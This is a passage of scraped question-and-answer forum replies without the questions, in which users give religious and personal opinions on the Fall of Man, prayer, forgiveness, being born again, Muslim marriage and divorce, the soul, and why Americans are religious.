they, have the answer, the only pathway to heaven.    I believe there is a loving, forgiving, understanding God who allows as many paths as it takes for His children to find Him. If that path leads through some Eastern religion, some Christian or Muslin or Jewish or non-affiliated belief system, it doesn't matter to a loving, embracing God.     My God keeps all paths open.|`|OqcTPhiSaa	Hi Phae :)    I'm Christian, but I don't interpret "the fall" with nearly as much emphasis as many Christians traditionally have. That's probably not so good on my part, but I find when you look at the whole world as though everyone's inherently bad you forget to see all the good.    I also think Christians should take notice that the Jews don't have a concept of Original Sin - and they had these texts LONG before we ever started using them... (Frankly I think they're sometimes annoyed at the way we interpret some stuff, and I don't blame them LOL).    And THEN you've got Christians who think the creation literally happened in 6 days, while others lean toward evolution with a rationale that even if God wanted to explain evolution to a guy like Moses thousands of years ago it would have been really overwhelming for Moses to "get up to speed."    As for me, I don't care if the world came into being in six literal days or billions of years. I see clues in creation that Something intelligent designed it with a certain stability and order. I agree with biblical texts that all that was created, so to speak, is GOOD :)    I think we're here because God wants us to be here. The same way you decide to have a baby. That baby is in your life because you want it to be. The baby brings you joy. Sooner or later the baby grows a little and starts to drive you crazy!! :-P    You want to explain all kinds of things to your kids when they're little but you can't. They're just too young. They're nowhere near ready to understand certain things.    You spend nearly two decades *wanting* to have a great relationship with that child, but find you're spending tons and tons of time just plain disciplining the kid. Grounded for lying, penalized for cheating... The child get into fights with siblings, may try stealing a bit, is inherently greedy until he's well into his teens.    But at the same time that child is the absolute light of your life and the apple of your eye!    That's what I think the "fall of man" can teach us. I don't think it's merely about what happened and how, but we recognize certain principles in the story. Things like: the earth is good. People are good (even though they do bad things sometimes). Our creator is like a parent--somewhat different from our human parents--but in *principle* the same. There's an order to things. There's stages and phases to go through. On and on.    And that's my interpretation. I own a copy of the Quran, but haven't had time to read that account yet. But I'd be willing to bet the principles are quite similar even if the account is slightly different :P    Have a great day!|`|MzKTLRgpaa	Each of us, when born, is still attached to the timeless eternal source of life. But within us also lies the tendencies to move away from that timeless world, into the world of time; from an inner world of silence to an outer world of noise and activity...    As infants, our attention becomes more and more attracted to the new world around us. Curiosity pulls our attention away from our inner silence into the noisy external world, and we begin to feel the pangs of birth (i.e. fear, distrust, doubt, and even anger)    This is what religions call the "fall from grace." For as we move out of our inherent state of innocence, we fall into a harsher world of "trials and tribulations." And thus, pain is experienced.    But the truth is... we are never separated from that timeless eternal source of life; that inner peace and silence. As it is within each experience, within each moment, all-ways. :-)|`|db7df25ea31227e5641d5c32d43c3bcdaa	man had a relationship with God    because of sin man became a sinner and could not come into god's presence. He became separated by his sin.|`|39c2f0bee655749f08686b4b9623eb79aa	The fall symbolizes the human consciousness break from nature. Humans are at the point where they have full self awareness & awareness of their actions on the world around them. So, with that comes some responsibility. Mankind is still eating the forbidden fruit. We continue to tear up the planet to gain material wealth. Our ignorance & sin is creating the majority of suffering. We have all the resources to create a perfect world. If we didn't choose to live out of fear & greed. There has to come a time when we stop building bombs to solve our problems. It might take the collapse of the eco system or a nuclear war to wake humans up. Maybe, this is what the story of noah's ark symbolizes, that nature has the right to start over if we get out of control|`|ciVoN7ARaa	It is not the fall of man,,but the fall of God he had the choice of introducing evil into the garden,,not man|`|Pq8IW1ziaa	Paradise Lost..    By making the wrong decision, then lying after being discovered, he laid the foundation for a curse upon us all. The Tree of Knowledge, and the fruit on it...could have been anything..    Because when Adam made the choice to do something he was specifically told not to do, he did it anyway, he made a choice to go against the Will of God.|`|jsYWgU8saa	The Fall is an allegory actually related to deep astrology and obscured sun worship (i.e. astro-theology). The fall takes place in the heavens when the Sun passes through the Autumnal Equinox, in the Sign of the Virgin/Virgo (Eve). As the Sun crosses into Libra, it descends or 'falls' into the Winter Quarter or 'Fall' of the year.     The Serpent/Tempter's tail drew after him a 'third part of the stars' i.e. from Cancer to Libra, 4 constellations, one third of the 12. Going before her, the Serpent leads the Woman towards the setting point in the West (seduction).     Adam (Bootes) follows towards the horizon, driven forth by the power that causes the revolution of the heavens which carries them out of the Garden.    At the moment of Expulsion, or as Adam and Eve (2 constellations) sink from view below the western line, the constellation Perseus appears in the East, in armour and helmet, a vengeful being holding aloft a 'flaming sword'.|`|97oxJ0B8aa	We had eternal life and we walked and talked with God.  And we lived in paradise.  And there was no murder, lies, hatred, envy, sickness, sorrow, pain, divorce, poverty, hunger, shame, loneliness....  Compared to today, yeah I'd say we "fell"|`|3b592d2cb161619b043cacf776619609aa	There was no real fall involved; this is only a misinterpretation.    When the bible speaks of partaking of the fruit of the tree of knowledge of good and evil you are reading what is called a metaphor. Knowledge of good and evil is a metaphoric reference to judgment. When you judge something you attempt to determine if it is acceptable or not. In effect you are deciding if it is good or evil from your point of view.    Once we were just like the animals and recognized that everything in the garden that God had given us was good. At some point we started to judge some thing as being better than others are. This set up a situation where somethings were more appealing to us than others. We started wishing for these things and were no longer happy with some of the other things in the garden.     This is what is commonly referred to as the fall of man, or separation from God. Some references actually call this the detour into insanity. This self-induced separation from the knowledge of the perfection of gods gifts to us was never shared by the animals. They were too smart to fall for this silly idea and were not fooled by the ideas of good and evil. For this reason they exist along side of us still experiencing the perfection of the garden. While we have excluded ourselves with our ideas of judgment. This is a truly fascinating subject that has many interesting facets. Including how to reverse the process and return to the original state.      Love and blessings.  don|`|qnt1wAfiaa	Not only does the Koran give a different interpretation, so do the Jews give a different spin on the meaning of Genesis.    Judaism does not take Genesis to have a 'fall of man' as the Christians believe in it, nor does it buy into the concept of original sin.|`|b9dae40ef8a10998c029b6d46aa0359daa	I believe that the exaltation of spirit depends upon the flesh being sacred and male and female knowing this thus the knowledge of good and evil is necessary.

When a person sins, they are not longer in the grace of God. To gain His grace again, you need to repent and make atonement then God forgives you.|`|A01w1dHqaa	It's a fall like in falling asleep.  Some here say we must go through our punishment to wake up. I'd say we've been punishing ourselves long enough, if that were the solution, we would be awake already.     When we see into our perfection, the love we were created in, we accept our atonement, crawl out of the hole of illusion (our separation from God) that we have been making. and we wake up. Miracles then spread like wildfire.|`|J7KSKm54aa	That is true, but it was more like pushed down than fall.|`|AA10116612	It was a trap for Satan, he took the bait.

BFcVLRc2aa	Born to because we as human beings have the free will to do that kind of thing (I don't but I know others who do).     Masturbation is actually pretty healthy to do. It's fluent in all sexual lifestyles. Gay, Straight, Bi, anyone can do it.    And sex is about more than reproduction, alot of the times it's not about reproducing at all. I don't know why people insist it is.|`|6SwaWSoyaa	Hey goofball do you realize you can type masturbate and homosexuality?

The answer to your question is that people choose to.|`|AA11812857	I'm not gay or anything. But, I can tell you that sex is not about reproduction. Reproduction is a product of sex. Many many people have sex just to have sex. Some people have sex without even having the ability to reproduce. So, before anyone could even answer the question, it should be first made clear that the assertion that sex is about reproduction is incorrect.     A person who is homophobic usually is sexually repressed. So, they would answer that masturbation is a sin and, something we would both agree on, is a choice. However, I know it is a choice we all make because it is natural. Sexually repressed individuals would simply place guilt with that choice. And I don't do guilt on what is natural. Sex is natural. Masturbation is natural. Love is natural. And by that alone, I can only surmise that homosexuality is natural as well.|`|e99558c7c874edb09af2121c3e8bf91faa	enjoy it ;DDD|`|4JTlbGm1aa	Sex isn't about reproduction lol.

VyR7efSHaa	Isaiah 65:24 And it shall come to pass that, before they call, I will answer; and while they are yet speaking, I will hear.     Matthew 7:7 "Ask, and you will receive; seek, and you will find; knock, and the door will be opened to you.  Matthew 7:11 As bad as you are, you know how to give good things to your children. How much more, then, will your Father in heaven give good things to those who ask him!    Matthew 18:19 "And I tell you more: whenever two of you on earth agree about anything you pray for, it will be done for you by my Father in heaven.    Matthew 21:22 If you believe, you will receive whatever you ask for in prayer."    Mark 9:23-24  Jesus replied, "Why do you say *'IF* you can'? Anything is possible for someone who believes!" Right away the boy's father shouted, "I do have believe! Please help my unbelief!"    Mark 11:24 For this reason I tell you: When you pray and ask for something, believe that you have received it, and you will be given whatever you ask for.    Luke 11:8-10 Well, what then? I tell you that even if he will not get up and give you the bread because you are his friend, yet he will get up and give you everything you need because you are not ashamed to keep on asking.  And so I say to you: Ask, and you will receive; seek, and you will find; knock, and the door will be opened to you.  For those who ask will receive, and those who seek will find, and the door will be opened to anyone who knocks.    John 14:13 And I will do whatever you ask for in my name, so that the Father's glory will be shown through the Son.    John 15:7 If you remain in Me and My words remain in you, then you will ask for anything you wish, and you shall have it.    John 16:24 Until now you have not asked for anything in My name; ask and you will receive, so that your happiness may be complete.    James 5:16 So then, confess your sins to one another and pray for one another, so that you will be healed. The prayer of a good person has a powerful effect.    1st John 3:22 We receive from him whatever we ask, because we obey his commands and do what pleases him.    1st John 5:14-15 We have courage in God's presence, because we are sure that he hears us if we ask him for anything that is according to his will. He hears us whenever we ask him; and since we know this is true, we know also that he gives us what we ask from him.     Peace.|`|3306acbb7100c0f39897a04c473a7708aa	Why are you so angry?|`|XUPuNAPlaa	Somethings if we try too much it doesn't happen.    ask to see the truth or the way  and it may reveal itself to you slowly and in unusual ways.|`|6WQo6RpSaa	You can't ask for any old thing and expect to get it...or if you do ask for something, then you can't expect it to just magically appear right away. I think he wants us to ask the right questions so that we may find the right answers on our own.    As for being righteous, I think he just wants us to be the best we can be. I don't think anyone can ever be as righteous as he is, but if we follow the Ten Commandments, read the Bible, and just be nice people, then I think that's about as righteous as we really need to be in his eyes =/|`|deqX4oQQaa	Well we have to have faith in Him now. Hebrews 11:1&6. This is from the NKJV, Now Faith is the substance of things hoped for, the evidence of things not seen. 6. But without faith it is impossible to please Him, for he who comes to God must believe that He is a rewarder of those who diligently seek Him. Matthew 6:33 says, But seek first the kingdom of God and His righteousness, and all these things shall be added unto you., Then Matthew 7:7-8 states Ask and it will be given to you; seek, and you will find; knock, and it will be opened to you. 8. " For everyone who asks receives, and he who seeks finds, and to him who knocks it will be opened. Mark 11:22-26. You have to have faith in Jesus Christ John 3:16-19, & 36; 14:6. To all reading this plkease believe in Jesus and repent of your sins. Repent means a changing of you mind a 180% turn from sin to Jesus and Jehovah Elohim. Most of don't change all over night. We are works in progress. The potter and the Clay in Jeremiah 18. Just ask King of Kings and Lord of Lords ( Rev. 19:6) for forgiveness of sins. 1 John 1:8-10, James 5:15 so you won't burn in hell. Luke 16:19-32. Please heed this cry. But as always I wish all a blessed day while here on planet earth!|`|QdAEKbveaa	Your going about this process all the wrong way. Before you seek anything I suggest that you learn and understand who Our Creator is in a personal fashion. After learning about him and falling head over heels in love with him, then can you have a firm basis in what character traits he himself finds great joy with.    Mastering or perfecting the inner man is a life long process, because a chance to practice virtue is always available, yet at the same time, when you reach the point of being able to completely control your human nature and you don't fall from the state of grace, I would say you have reached the level of being Christ like in the most base human form anyway.    It's a process of Mastery of the self. You need Christ in order to attain these heights, yes by constant love filled prayer, and a desire to do The fathers will without dispute, all of these things are part and parcel to the growth process. Without Christ nothing is possible, and if you arnt following his commands to the utmost best of your human capacity you need to begin doing so or else nothing will come about.    You don't know God if your calling him a liar, don't try to force anything from him. It's by his mercy that your still allowed to live, so be patient and have respect for his mercy and maybe he will move you to growth.    Here is a book to start you on your way.    Blessings

And credit should be given to the rightful author, Joshua Harris.    Brian Moore did read this essay aloud at a meeting of Christian athletes, and he did claim to his parents that he'd written it as an assignment for the Fellowship of Christian Athletes approximately two months before his death. The 17-year-old Teay's Valley High School student (not "Teary Valley," as claimed in the e-mail) did die on 27 May 1997 in the manner described. All that is true.    However, it's the little known story behind the story that proves most worthy of comment. You see, it turns out the deceased was a plagiarist. The piece he'd claimed authorship was actually the work of Joshua Harris, and it appeared in a book Harris published before Moore died. It had debuted two years earlier, in the Spring 1995 issue of New Attitude magazine, which was then edited by Harris.    Moore's parents had no reason to suspect the work in question was not their son's, and it was read at the boy's funeral. They and other relatives and friends subsequently broadcast the essay as his work, sincerely believing that it was. Only after the piece was published in The Columbus Dispatch on the anniversary of Moore's death did the truth about its authorship become known, when readers responded with corrections that pointed the newspaper to Harris and his book.    It's ironic that an essay describing the author's sense of shame over his personal accumulation of sins would be used by another to add a few file cards to his own stash. The dead boy not only stole someone else's work but also presented it as his own before a Christian fellowship he was part of and lied to his parents about it. That's three of the ten commandments right there (stealing, not honoring parents, and bearing false witness).    What a terribly sobering thought, that this young man may have met his Maker without having gotten this under the Blood.    1 Tim 5:24 -- Some men's sins are open beforehand, going before to judgment; and some men they follow after.
2Hot9EJiaa	The greatest purpose in life is to glorify God and enjoy Him forever. However, those that don't believe would never understand that.  When you ask if God can make His own glory.  His is majestic and glorious already, but the greatest joy is to live my life to glorify Him.|`|aBHY2iXraa	All those "greater purpose" ideas become apparent, only with the benefit of hindsight - so maybe it's simply a case of "s.h.i.t happens".|`|564d359090a6d360bec9ee3849107a51aa	The glory of God.|`|HWoLbR7Aaa	To create as much plastic as possible for our alien overlords.|`|Eo7KcX3Waa	For everyone to be saved and go to heaven to live there with Jesus, that would certainly be His desire...|`|RhPNV1ohaa	That is a very important and pivotal question. Do you understand the purpose of the car? Do you understand how it is created in our image? Look at the things we share with the car. Water cooled, Temperature, Electrical system, Diagnostic system, Consumption system, Elimination system, Air breathing, Carbon dioxide exhausting. The meaning and purpose of the car is directly tied to it's creator. Without us it would not exist. Its' existence is directly dependent upon us. It is designed to serve us and if it fails it purpose well its' end is in sight. Our claims over the car are the same as God's claim over us. So if we would have meaning and purpose to life we must find out God's plan for our lives rather than following our own way. When we find His way life will spring forth in new meaning and will contain a greater value and fascination.

PoTY8CNFaa	It depends on what religion or sect of religion you go by. Several protestant christians believe that by truly believing in your heart that Jesus is God, and confessing that belief then you are forgiven for everything. Other groups believe that when Jesus died on the cross that everyones sins were forgiven instantly and that the "grace" of God cannot be stopped. Basically saying even if you don't believe in your heart or say it out loud Jesus/God loves you so much that he died for your sins with or without your permission. This is called forgiveness by grace. Another type of forgiveness I've heard of is forgiveness by acts. The idea here is that you must live a christian life (help others, love one another, do good deeds) in order to be forgiven.    I think these are 3 major protestant ideals but you can get a wide range of answers from different groups of people with different beliefs.    It really can vary significantly between religions.|`|AA10733606	Even Satan and all the demons believe Jesus is God, so no simply believing Jesus is God will not get even one sin forgiven.  You must accept Jesus as youe savior and ask for forgiveness of your sins.|`|sGojEWOxaa	No, they can't believe in Jesus as "a" God.  They must repent (which literally means to turn away from like doing a 180). God will forgive a person for any sin that they have committed, but there are always consequences, they may have to spend the rest of their life in prison, or even be put to death.|`|ffb16e0ffc6a4152dbf3d94c25cd5995aa	Deliberate sin is the only sin that won't be forgiven.    If we deliberately keep on sinning after we have received the knowledge of the truth, no sacrifice for sin is left, but only a fearful expectation of judgment and of raging fire that will consume the enemies of God. Anyone who rejected the law of Moses died without mercy on the testimony of two or three witnesses. How much more severely do you think a man deserves to be punished who has trampled the Son of God under foot, who has treated as unholy thing the blood of the covenant that sanctified him, and who has insulted the Spirit of grace. Hebrews 10:26-29.|`|nIu8zVkXaa	First of all, Jesus is not A god.  He is God and also the Son of the Father God.  Should a person commit murder as a believer I would assume that their belief is limited to just that.  Believing in Jesus Christ is more than just acknowledging that He is God.  When John wrote that "whosoever believes in Him, should not perish but have everlasting life.", the word in between believes and Him in the Greek language is better translated "into" in the sense of a marriage where a man and a woman become one.  That is why we, the church, are called the bride of Christ.  As for simply believing in Jesus Christ, even the demons and Satan "believe" in Him, they acknowledge Him in the scriptures but they have no salvation.  Therefore the relationship with Jesus Christ has to be more than just acknowledging His existence.|`|elNfGEHgaa	your god is a fraud|`|S9f5vOfEaa	YES,  people are killing and torturing in the name of god and get away with it for thousands of years    and may god bless america    let the killing and torturing continue in her name|`|1GgC164qaa	No, Scripture tells us that our sins are forgiven if we repent of our sins Christ is faithful to His Promise and will forgive them.|`|97oxJ0B8aa	James 2:10, at the heart level we are all guilty of all sins.  Besides that, the murderer would have to be sincerely repentant.  Salvation comes based on a change of heart that places trust on Christ, gives loyalty to him, and repents - forsakes all that opposes Christ.  Of course we can't really reach that level of perfection, but the fundamental decision of heart must be the one above described, it's not just signing your name on a roster saying "I agree Jesus is God".  Satan could sign that list as well.|`|jMGyLvNsaa	If you really believe in God and accept him into your life, and you forgive others for sins they have done to you, then of course yes.|`|7aK81hsbaa	god/love/life never forgives because he never condemns nor judges. all of us are part of her and all parts of him are perfect.|`|rTplTuEdaa	Our past sin,s are forgiven,,if we commit more sin,s  then we    have to repent,,how could God forgive us of future sin,s we haven't    even committed,,them yet,,we live day by day,,if we sin we  must repent or go to Hell.|`|TinNG7k7aa	No, that doesn't make sense.|`|25qUTYLEaa	Yes, they would be forgiven if they sincerely repented..but, if they REALLY HAD Jesus in their heart, they wouldn't want to hurt ANYONE.|`|uZQIUeyvaa	yes|`|i0OVwfcyaa	Yes, according to the bible, as long as they say they're sorry.    Then again, according to the bible, Ghandi is in hell.|`|yCdcF3Jcaa	yes|`|AA11220299	No. Many sins are not forgiven. Jesus said if you do not forgive others for their sins against you then He will not forgive you for your sins. That is just one example of a number of unforgiven sins.|`|9mLjDa5kaa	YES, forgiven  :)|`|DrFrkM63aa	no. you must be truly sorry for your sins and (if you are catholic) confess your sins in the holy sacrement of reconciliation.  pray to God. ask his forgivness.  he loves you and everyone on this earth|`|rz4AUvbaaa	No.  They must overcome sin, and this is forgiveness.|`|QyAyQf3Laa	When you dedicate yourself to serving God and imitating his Son, Jesus Christ, you shed your old personality and put on the new. This means you repent against your former immoral lifestyle and through much prayer, you can be reformed. Jehovah God expects us to act on our prayers when we dedicate them in "prayer" to him. He is forgiving to those who are not faking and who work at staying away from their former course of immoral lifestyle. But to those who are fakers and think they are fooling him, he is far away and does not hear.    Proverbs 15: 29    Jehovah is far away from the wicked ones, but the prayer of the righteous ones he hears.  ------------------------------    Faith without works is dead.    Faith, if it does not have works, is dead in itself. (James 2:17) All true Christians must show that their faith is a live faith, because faith without works is dead. (James 2:26) Ones faith must show up through work in some way. So their faith shown by works has been productive.    Think of James words again: Of what benefit is it, my brothers, if a certain one says he has faith but he does not have works? (James 2:14) Remember, he is talking to those who have dedicated their lives to God and are baptized. He is addressing his words to my brothers. Are we to assume that about 250,000 of our brothers and sisters are trying to show faith without any works? It is something to ponder over.    Faith divorced from deeds is lifeless as a corpse. (James 2:26)    How Can You Gain His Favor?    Jehovah God leaves no confusion as to? his view of those who claim to be on his?side but who will not worship the Father with spirit and truth. (John 4:23) If a nation, a religious group, or a person is not acting in accord with Gods revealed standards, any religious displays are pointless. For instance, religious festivals and sacrifices were a required part of true worship in ancient Israel. (Leviticus, chapters 17,?23) Yet, Isaiah set out Gods viewdispleasure with the unfaithful Jews keeping those observances. God said: When you spread out your palms, I hide my eyes from you. Even though you make many prayers, I am not listening. (Isaiah 1:11-15) That is just as true today. Rather than mere religious ceremonies or memorized creeds and prayers, God wants prayers and right deeds that come from the heart.    Exercising faith and relying on Jehovah (2?Corinthians 4:1,?7); seeking Gods help through sincere and persistent prayer (Luke 11:8-10); and?following through and acting in harmony with our prayers, will gain God's favor. (James 2:14, 17)     GALATIANS 5: 14 - 26:    For the entire Law stands fulfilled in one saying, namely: You must love your neighbor as yourself. If, though, YOU keep on biting and devouring one another, look out that YOU do not get annihilated by one another. But I say, Keep walking by spirit and YOU will carry out no fleshly desire at all. For the flesh is against the spirit in its desire, and the spirit against the flesh; for these are opposed to each other, so that the very things that YOU would like to do YOU do not do.     Furthermore, if YOU are being led by spirit, YOU are not under law. Now the works of the flesh are manifest, and they are fornication, uncleanness, loose conduct, idolatry, practice of spiritism, enmities, strife, jealousy, fits of anger, contentions, divisions, sects, envies, drunken bouts, revelries, and things like these. As to these things I am forewarning YOU, the same way as I did forewarn YOU, that those who practice such things will not inherit Gods kingdom. On the other hand, the fruitage of the spirit is love, joy, peace, long-suffering, kindness, goodness, faith, mildness, self-control. Against such things there is no law. Moreover, those who belong to Christ Jesus impaled the flesh together with its passions and desires. If we are living by spirit, let us go on walking orderly also by spirit. Let us not become egotistical, stirring up competition with one another, envying one another.  -----------------------|`|8Y0iCF2maa	have faith|`|zzivfC0qaa	The sin is forgiven, but the sinner is not.

For one, Jesus isn't God. Jesus is the son of God. Number two, God will always forgive as long as that person truly, and honestly ask for forgiveness, and thanks Jesus Christ for dying on the cross for our sins. An effort will be needed by that person to accept Jesus Christ into their life. But God will always love you no matter what, because God is perfect! For God not to love and not to forgive would make him not perfect!
AA10242926	Jesus told Nicodemus "you must be born again".  It is a spiritual thing.  Your way of thinking changes.  Your world view changes.  Your tastes change.  Everything about you changes.  Your born again.

It is impossible to lose or "leave" salvation.     The truth about Jesus is that the only way to be saved and to get into heaven and avoid being sent to eternal hell, is by believing in faith alone that Jesus, who is God, died for our sins on the cross as FULL PAYMENT for all our sins, and then Jesus rose from the dead (1 Corinthians 15:1-4). Believe this and you will be in heaven, no matter what!     Please pray now: "Jesus, please forgive me of my sins. I believe that You died on the cross for my sins and You rose from the dead. Thank You for eternal life!" You will be in heaven with Him forever when you die. :)|`|5tMCDu8gaa	Usually something along the lines of "I am no longer responsible for any of the terrible things I've done cause GOD WILL SAVE ME!"|`|zMcHYQeBaa	You become a new creature in Christ|`|3aVxJYf6aa	someone who believe Jesus is his own father...Jesus is God almighty...and Son of God almighty at the same time...|`|4ca0eb3626d5a5606026c4c4edf9b223aa	When you receive Jesus as your Lord and Saviour, and ask Him into your heart and life, and to forgive you of your sins, He literally comes in and transforms you, mind, spirit, body, soul... and it's like you're born again...

As Jesus talked with Nicodemus, He said, I tell you the truth, no one can see the kingdom of God unless he is born again. How can a man be born when he is old? Nicodemus asked. Surely he cannot enter a second time into his mothers womb to be born! Jesus answered, I tell you the truth, no one can enter the kingdom of God unless he is born of water and the Spirit.

5ofS2qQYaa	idk, but here are some links to people who might:    Is it permissible to live with a husband who takes out a riba-based loan?  "  With regard to his consuming riba, this may be grounds for you to ask him for a divorce (talaaq) or to ask for khula, but you do not have to do that, rather it is o.k. for you to stay with him and live with him whilst continuing to advise him to do that which is better, especially if there is the hope that he will mend his ways.   "  http://www.islam-qa.com/en/ref/20002/    I have no experience in this, but i would only ASSUME that the best way to address such situations is to be clear and open with what it is you would like to discuss w/your people    about holding on: yea..it's a mix of everything put together usually...but i wouldn't know, so don't take my word    Allah(swt) knows best|`|74fe5c642d059f46a34e9d235a375172aa	I've never been in condition that makes hijra is necessity, and I think I would never ask that to my husband because we don't have much money, and hijra need us to spend much money, asking to move to somewhere else could be a heavy burden for my husband.    I asked a man to marry me, man that now become my husband, because I know he's a devout muslim that never leave praying or take riba. I love him because of Allah, and if someday he changes become far from Allah, then there's no reason to love him, and I can ask him to choose; back to Allah's path or I will ask for divorce.    I've seen many Muslimah who are treated very bad by their husband, and they're abused, but they couldn't ask divorce coz they are afraid no one will take care of her (and her kids) life after divorce. I feel so pity with those Muslimahs, that's why I think Muslimah should be educated, so if something bad happen, they can stand by themselves.|`|i1t6vxe5aa	If a husband is sinning, such as not praying or eating riba, she has every right to divorce him, not only that, but she has to divorce, a muslim who does not pray is no longer a muslim.    As to the reluctance to divorce: In the society where I come from, when a woman is divorced, there is a less chance of anyone else marrying her. of course she can fend for herself, but even if children are involved; if divorce is the only halal outcome to a marriage, then that step must be taken wether both spouses disagree or not. Of course they can always stay together in sin.    It may also have something to do with a hadith that the prophet said: 'A woman who has no good reason for divorce will never smell jannah.' That is only if she fears Allah - but even then, the prophet was talking about trivial things, and that sometimes women let their emotions get control of them.     I hope my answer satisfied you brother.    Salaamu Alaykum.....Peace be upon you  That is only if|`|mYqfr0fIaa	I live wih my mom who barely comes home cuz ____nographic lady.

I do it in as respectful a manner as I'd like him to speak to me about my shortcomings.    Regarding prayer, I just ask him to pray with me.  but as a non-Muslim, I don't pray regularly, so...it's not the same as your situation.    As to the second part, I think it's a combination of (1) if there are children, they stay for them, (2) they think all men are the same [they aren't], and (3) they fear being alone.    These are female concerns that transcend religion.  Hopefully women everywhere will require more of their relationships.

In many Spanish-speaking countries, there's a similar tradition for the 15th birthday - La Quincea?era. This one is more religious-themed, I think, and tends to be a lot more elaborate than an average American sweet-16 party.

First of all, your "spirit" comes from your parents, you inherit it like your genes. It's not like the Mormon heresy that all the little baby spirits are up in Heaven or somewhere waiting to be born. As for the spirit leaving the body when you die, perhaps -- that's what a Platonist or a gnostic would teach - but if you read First Corinthians Chapter 15 Paul doesn't really teach that. The Bible teaches resurrection of the body -- Jesus says "I am the resurrection" -- not some Platonic, disembodied "spirit" floating around on clouds somewhere. You really have to stick to what the Bible itself says and teaches, not the popular notions we can pick up from books and movies and preachers.|`|tEn2nnsuaa	sources?    the spirit doesn't exist, so it can't have an origin.|`|rZhx3Nwuaa	It has always been there, you have a physical  body and a spiritual body.  When you die the  spiritual body leaves the body, and the physical body is buried, as flesh and bones cannot enter heaven.|`|FvoxgjbJaa	Many call themselves Christians but they are not members of the One, Holy, Catholic and Apostolic Church, founded by Jesus Christ, true God and true Man, and outside of which there is absolutely no salvation.     I tell you this because, not unlike the Father, I desire the salvation of all men.    We are living in very perilous times; what the Church calls eschatological times. I will not prophecy when the Second Coming of Christ will be except to say that it gets closer with the passing of every day, as does my own anticipated departure from this world.    Soul is synonymous with spirit. Suffice it to say that God is our first beginning and our last end. Yes the spirit or soul never dies because it is made in the image of God--Who is eternal. But if our death is a bad one, that is we die outside of the Catholic Church, then truly our eternity will be with the devils in Hell and this is what Scripture refers to as "the second death," for as our Lord warns us about those who betray Him: "It were better for him had he not been born."|`|AA11139575	Your are correct in saying a person has a body, but a person does not have a soul. All humans as well as animals are souls-Genesis 2:7; 1 Peter 3:20; Genesis 1:20, 21, 24, 25; Leviticus 24:17, 18    Your spirit is the life force that is in your body which enables you to be alive. At death, the Bible says the spirit returns to God who gave it. The spirit is not a literal thing that travels back to God at a person's death. This verse is simply saying that your prospects for a resurrection are in God's hands since he is the only one who can give back the spirit or life force to you so you can become alive again- Ecclesiastes 12:7

You could also replace the comma with the word "because."      The word "conceive" isn't technically incorrect I don't think, but people really don't talk that way and that is why it sounds weird.|`|ecOfV8Blaa	Just one thing - make sure you space out the next word that comes before the comman.

P91FugsAaa	The USA is not the most religious western country.  Many countries in Central America have populations that are almost totally religious.  Try visiting El Salvador.|`|k8AcVixTaa	Simple answer.  Americans are very easily led and swayed to believe in anything, even the most ridiculous of ideas.  I am American so no accusations that I don't nothing anything about America.  Here's to hoping that we will wise up and give up predication's to the myths of Christianity as absolute truth.|`|97oxJ0B8aa	Maybe we aren't "holding on" to ancient ideas but merely giving lip service to them.  Plus, in the Biblical record, every time Israel sinned, they sinned far worse than the unbelieving nations that surrounded them.  There seems to be some principle that the more someone knows the truth the harder they will sin in order to bury it from their own conscience or perception.|`|GQk0UNjfaa	you can thank ronald reagan for that. he invited christian supremacists right into politics|`|ypVQlOJvaa	::sigh::    I ask myself this on a regular basis.

Manifest Destiny, anyone?    .|`|66ae930022bf29f4c8379012ac4ae691aa	I think you'll find many South American countries to be far more progressive than America.    The irony is that America was the first and the only nation to have a constitutionally mandated separation of church and state. This perhaps forced religion to sink or swim, having no support from the government.  This forced Christianity in America to become very self-sufficient and a marketable commodity.  Subsequently, religion has become very successful.  In America Jesus is free enterprise.  This may explain it.|`|tI1NHwfBaa	I understand the point you're trying to make.  But your question fails on the basis of logic.    You've identified two distinct data points (rates of religion and rates of crime) and attempted to connect them simply by juxtaposing their statistics.  This is just exceptionally bad science.    Does weather or climate play a part in crime rates?  Does social welfare programs?  What is the per-capital spending for police, courts, and criminal confinement in each country?  There are so many holes in your "argument" that its not even able to stand up under its own weight.    You might as well compare foot odor to crime.  Or per-capita fish consumption.  Perhaps deodorant use has an impact on crime, as well.    What are they teaching in schools today??    ----    I've seen your response saying you don't agree, but this is not something you can choose to agree with or not.  You appeal to science as the basis for rejecting belief in God (which is a foolish proposition in its own right) but you clearly do not have an understanding of how complex systems cannot be boiled down to one data point.      In my previous (absurd) example, I showed your faulty logic.  If we can show that Sweden sells fewer Dr. Scholls Odor Eaters per capita (a rate of .34 per cap), and America sells more Dr. Scholls Odor Eaters per captiat (at a rate of .72 per capita), then using your logic we can conclusively prove that foot odor causes higher crime rates.  Or perhaps foot odor causes people to be more religious.  Either way, it's a ridiculous conclusion, because we know that a lot more than foot odor goes into motivating people to commit crimes.    Your attempt to link religion with crime is simply foolish -- every bit as foolish as my attempt to link it to foot odor.  You cannot make such a sweeping generalization and claim to be analyzing anything in a scientific manner.|`|jX6qoxaJaa	I wanna move to Sweden now.

That day is coming too.|`|Kbry7CnOaa	Cos in the USA people are free to be as stupid as they want to be...|`|8ubAwaGCaa	Because the ancient ideas are better than anything the Democratic party has offered to date.|`|SC7sxZDMaa	Our poor education system.  The rise of the religious right.  The strong anti-intellectual bias in the US.  The constant attempts to teach a myth (creationism) in public schools.  The constant attempts to misrepresent and discredit evolution.  Willful ignorance (this relates back to the anti-intellectual bias).  Government leaders who allow themselves to be intimidated by religious extremists.  Government leaders who circumvent the constitution to break down the separation between Church and State (Faith-based initiatives comes to mind).  Recent past (thankfully) Government leaders who claim that "god speaks through him" and voters ignorant enough to vote him into a second term.  (It's a well known fact that he lost the vote to Gore in 2000, but was able to connive his way into the office of President and in 8 years succeeded in introducing us to another "Dark Ages").  Obviously I'm referring to that useless, murdering, lying, hypocritical, and above all unbelievably STUPID George W Bush.    The arrogance of Americans who (wrongly) believe that they live in the best country in the world.  The myth that the US was founded on Christian principles (it wasn't).  The myth that the US is a Christian nation that needs to get back to those old Christian values and morals (which are often justification for immorality).  A poorly educated, brainwashed, gullible populous.    JBT:  While coincidence does not necessarily mean correlation, this seems to be a bit more than coicidence.  Think of all of the wars fought over religion, all of the differences in various Christian belief systems (which can lead to outright hatred,even violence against Christians with the slightest differences in doctrinal beliefs).  Think of the rampant immorality contained in the Bible.  There are many good reasons to see a correlation between crime (violent or otherwise) and religous belief.  And the point is that actual superior morality is possible in a land full of atheists.  Finally, science offers many good reasons for disbelief in a God.  You're blinded by your beliefs.

